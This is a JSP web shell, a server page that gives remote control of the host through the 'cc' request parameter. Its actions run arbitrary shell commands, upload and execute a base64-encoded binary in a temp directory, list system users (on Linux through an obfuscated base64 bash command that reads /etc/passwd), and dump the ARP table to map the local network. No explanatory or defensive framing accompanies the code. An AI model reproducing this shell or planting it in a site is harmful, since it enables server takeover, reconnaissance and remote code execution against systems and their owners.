<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.*" %>
<%@ page import="java.net.InetAddress" %>
<%@ page import="java.util.regex.*" %>
<%@ page import="sun.misc.BASE64Decoder" %>

<%! 
    String getLocalIP() throws Exception {
        try{
            InetAddress addr = InetAddress.getLocalHost();
            return addr.getHostAddress();
        } catch (Exception e){
            return null;
        }
    }

    String inputStreamToString(InputStream in, String charset) throws IOException {
        try {
            if (charset == null) {
                charset = "UTF-8";
            }

            ByteArrayOutputStream out = new ByteArrayOutputStream();
            int                   a   = 0;
            byte[]                b   = new byte[1024];

            if (null == in) return null;
            while ((a = in.read(b)) != -1) {
                out.write(b, 0, a);
            }

            return new String(out.toByteArray());
        } catch (IOException e) {
            throw e;
        } finally {
            if (in != null)
                in.close();
        }
    }

    boolean writeContent(byte[] str,String file) throws IOException {
        FileOutputStream fop = null;
        try
        {
            fop = new FileOutputStream(file);
            fop.write(str);
            fop.flush();
            return true;
        }
        catch(IOException e)
        {       
            return false;
        }
        finally {
            if (fop != null) fop.close();
        }
    }

    byte[] base64Decode(String str) throws Exception {
        try {
            BASE64Decoder decoder = new BASE64Decoder();
            byte[] bytes = decoder.decodeBuffer(str);
            //byte[] bytes = Base64.getDecoder().decode(str);
            return bytes;
        }
        catch(Exception e)
        {
            return null;
        }
        
    }

    String[] getUserlist() throws Exception {
    java.io.InputStream in=null;
    String result;
    
    String os = System.getProperty("os.name");
        if(-1 != os.indexOf("Windows")) {
        try{
             in=Runtime.getRuntime().exec("net user").getInputStream();
        result = inputStreamToString(in, "UTF-8");
    }catch (Exception e) {
        result = null;
        return null;
}
    

        String pattern = "--\r\n([a-zA-Z0-9|\\s|\r|\n]+)";
        Pattern r = Pattern.compile(pattern);
        Matcher m = r.matcher(result);
        if (m.find()) {
            result = m.group(1);
            result = result.replace("\n", " ").replace("\r", " ");
            return result.split("\\s+");

        }else{
        return null;
    }
        } else if(-1 != os.indexOf("Linux")) {

            //awk -F ':' '{print $1}' /etc/passwd
             try{
             in=Runtime.getRuntime().exec("bash -c {echo,YXdrIC1GICc6JyAne3ByaW50ICQxfScgL2V0Yy9wYXNzd2Q=}|{base64,-d}|{bash,-i}").getInputStream();
        result = inputStreamToString(in, "UTF-8");
    }catch (Exception e) {
        result = null;
        return null;
}
           
            return result.split("\n");
        } 
   return null;
}

    String[] getArp() throws Exception {
        java.io.InputStream in=null;
    String result;
    String pattern;
    Pattern r;
    Matcher m;
    String pr;

    String os = System.getProperty("os.name");
    if(-1 != os.indexOf("Windows")) {
         try{
             in=Runtime.getRuntime().exec("arp -a").getInputStream();
        result = inputStreamToString(in, "UTF-8");
    }catch (Exception e) {
        result = null;
        return null;
}
        pattern = "[a-zA-Z0-9|.]+\\s+([a-zA-Z0-9]{2}-){5}[a-zA-Z0-9]{2}";
        r = Pattern.compile(pattern);
        m = r.matcher(result);
        pr = "";
        while (m.find()) {
            pr += m.group(0).replace("\\s+", " ") + ",";
            
        }
        return pr.split(",");

    } else {
    //linux
    //
    try{
             in=Runtime.getRuntime().exec("arp").getInputStream();
        result = inputStreamToString(in, "UTF-8");
    }catch (Exception e) {
        result = null;
        return null;
}
    //String test = "192.168.246.254          ether   00:50:56:f1:48:6e   C                     eth0";

    

   pattern = "([a-zA-Z0-9|.]+)\\s+ether\\s+(([a-zA-Z0-9]{2}:){5}[a-zA-Z0-9]{2})";
        r = Pattern.compile(pattern);
        m = r.matcher(result);
        pr = "";
        while (m.find()) {
            pr += m.group(1) + " " + m.group(2) + ",";
            //result = "aaa";
            //result = result.replace("\n", " ").replace("\r", " ");
            //return result.split("\\s+");
            
        }
        return pr.split(",");
    }
}


%>
<%
    java.io.InputStream in=null;
    String result;
    String os;

    if("os".equals(request.getParameter("cc"))) {
        String[] userlist = getUserlist();
        os = System.getProperty("os.name");
        String local_ip = getLocalIP();

        result = "{";
        result += "\"host_ip\": \"" + local_ip + "\", ";
        result += "\"host_os\": \"" + os + "\", ";
        result += "\"host_username_list\": " + "[";
        for(int i=0;i<userlist.length;i++){
            result += "\"" + userlist[i] + "\", ";
    }
        result += "]}";
        
        out.println(result);
        out.flush();
        out.close();
    } else if("net".equals(request.getParameter("cc"))) {
        String[] arp_list = getArp();
        String lan_local_ip = getLocalIP();

        result = "{";
        result += "\"lan_local_ip\": \"" + lan_local_ip + "\", ";
        result += "\"lan_arp_list\": " + "[";
        for(int j=0;j<arp_list.length;j++){
            result += "\"" + arp_list[j] + "\", ";
    }
        result += "]}";

        out.println(result);
        out.flush();
        out.close();
    } else if("up".equals(request.getParameter("cc"))) {
    
        String tool = request.getParameter("tool");
        //out.println(tool);
        byte[] content = base64Decode(tool);
        //byte[] asBytes = Base64.getDecoder().decode(tool);
        //String content = tool;
        //out.println(content[0]);
        
        String f;
        os = System.getProperty("os.name");
        if(-1 != os.indexOf("Windows")) {
            f = "c:\\windows\\temp\\up.exe";
        } else {
            f = "/tmp/up";
        }
        if (true == writeContent(content, f)) {
            if(-1 != os.indexOf("Linux")) {
                Runtime.getRuntime().exec("chmod +x " + f);
            }
        
            String cmd = f + " \"" + request.getParameter("xmlws") + "\"";
            //out.println(cmd);
            in=Runtime.getRuntime().exec(cmd).getInputStream(); 
            
            result = inputStreamToString(in, "UTF-8");
            out.println(result);
            out.flush();
            out.close();
            
        }
        
        
    } else if("cmd".equals(request.getParameter("cc"))) {
        try {
            in=Runtime.getRuntime().exec(request.getParameter("xmlws")).getInputStream(); 
        } catch (Exception e) {
            in=null;
        }
        
        result = inputStreamToString(in, "UTF-8");
        out.println(result);
        out.flush();
        out.close();
    }
%> 